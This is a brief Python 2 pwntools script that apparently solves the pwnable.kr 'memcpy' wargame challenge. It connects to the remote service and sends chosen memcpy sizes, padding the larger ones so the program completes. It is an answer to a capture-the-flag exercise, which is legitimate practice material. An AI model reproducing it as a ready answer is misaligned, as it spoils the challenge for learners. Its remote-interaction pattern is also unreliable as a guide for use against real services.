from pwn import *

p = remote('pwnable.kr', 9022)
p.recvn(491)

for x in range(3, 13):
    p.recvregex('specify the memcpy amount between \d+ ~ \d+ :')
    if 2**x >= 64:
        p.sendline(str(2**x+5))
    else:
        p.sendline(str(2**x))

print p.recvall()
p.close()